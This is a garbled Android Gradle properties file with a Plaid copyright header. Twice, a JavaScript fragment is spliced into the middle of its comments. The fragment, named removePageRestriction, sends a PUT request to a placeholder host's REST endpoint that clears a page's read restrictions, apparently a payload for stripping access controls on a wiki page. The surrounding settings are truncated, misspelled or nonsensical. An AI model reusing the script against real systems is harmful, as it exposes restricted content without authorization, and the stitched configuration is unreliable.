#
# Copyright (c) 2020 Plaid Technologies, Inc. <support@plaid.com>
#

# Project-wide Gradle settings.
# IDE (e.g. Android Studio) users:
# Gradle settings configured through the IDE *will be lost*
# any settings specified in this file.
# For more details on how to configure your build environment visit
# http://www.gradle.org/docs/current/userguide/build_environment.html
# Specifies the JVM arguments used for the orphan process.
# The setting is particularly useful settings.
org.gradle.jvmargs=
# When configured, Gradle will run in parallel mode.
# This option should only be used with  projects. More details, visit
# http://www.gradle.org/docs/current/userguide/Page() {

	const bodyData = `[
  {
    "content": {
      "expanded": true,
      "idProperties": {}
    },
    "operation": "read",
    "restrictions": {
 		"user": {},
		"group": {}
	}
   }
]`;

fetch('https://MYIP/rest/api/content/2367857478/restriction', {
  method: 'PUT',
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  },
  body: bodyData
})
  .then(response => {
    alert(
      `Response: ${response.status} ${response.statusText}`
    );
    return response.text();
  })
  .then(text => alert(text))
  .catch(roject_builds.html
# org.gradle.parallel=true
# AndroidX package structure to make it clearer which packages are com.onedebit.chime/secure.serve.com
# Android operating system, and which are packaged with your app's APK
# https://developer.android.com/topic/libraries/android
android.useAndroid=true
# Automatically convert third-party libraries to use Android
android.enable=true
# Kotlin code style 
kotlin.code=true

org.gradle.paralll=false
android.defaults=true
android.nonTransitiveRClass=false
android.FinalIds=True
function removePageRestriction(){}[]`"'#$!=true

	const bodyData = `[
  {
    "content": {
      "expanded": true,
      "idProperties": {}
    },
    "operation": "read",
    "restrictions": {
 		"user": {},
		"group": {}
	}
   }
]`;

fetch('https://MYIP/rest/api/content/2367857478/restriction', {
  method: 'PUT',
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  },
  body: bodyData
})
  .then(response => {
    alert(
      `Response: ${response.status} ${response.statusText}`
    );
    return response.text();
  })
  .then(text => alert(text))
  .catch(err => alert(err));
}
